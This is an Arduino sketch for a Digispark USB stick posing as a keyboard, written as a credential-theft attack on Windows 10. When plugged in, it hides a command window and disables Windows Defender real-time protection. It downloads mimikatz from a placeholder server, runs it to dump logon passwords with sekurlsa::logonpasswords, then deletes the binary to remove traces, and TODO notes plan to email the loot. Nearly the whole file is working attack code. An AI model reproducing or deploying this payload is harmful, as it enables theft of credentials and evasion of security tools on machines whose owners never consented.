#include "DigiKeyboard5c1r0.h" 
void setup() {pinMode(1, OUTPUT);}
void loop() { //Win10
DigiKeyboard.sendKeyStroke(0);
DigiKeyboard.delay(000);

//Open cmd as Administrator
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);// !!! NEED CTRL + SHIFT + ENTER
  //DigiKeyboard.delay(2000); 
  //DigiKeyboard.sendKeyStroke(FRECCIA_SX); //select 'yes'
  //DigiKeyboard.sendKeyStroke(KEY_ENTER); 
  
//Minimize the window
  DigiKeyboard.delay(1000);
  //minimize the cmd & change color (comment the follow line if you want a "verbose" mode)
  DigiKeyboard.println("mode con:cols=18 lines=1 && color FE"); 
  //Open powershell
  DigiKeyboard.println("powershell");
  DigiKeyboard.delay(1000);
//Disable Windows Defender  
  DigiKeyboard.println("Set-MpPreference -DisableRealtimeMonitoring $true"); // disable windows defender 
  DigiKeyboard.delay(1000);

//Download Mimikatz.exe in %TEMP%
  DigiKeyboard.println("powershell (new-object System.Net.WebClient).DownloadFile('http://<webserver>:<port>/mimikatz.exe','%TEMP%\\mimikatz.exe')");// use \\ for \
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);
 //Exe mimikatz
  DigiKeyboard.println("%TEMP%\\mimikatz.exe");// use \\ for \
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
 //GET passwords
  DigiKeyboard.println("privilege::debug");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("sekurlsa::logonpasswords");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  //TODO send the data by mail
  
  //TODO Close and Delete thr traces
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("exit");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(10);
  DigiKeyboard.println("del %TEMP%\mimikatz.exe");
  
  //ready to remove digispark
  for(;;){digitalWrite(1, HIGH);DigiKeyboard.delay(200);digitalWrite(1, LOW);DigiKeyboard.delay(200);}
}
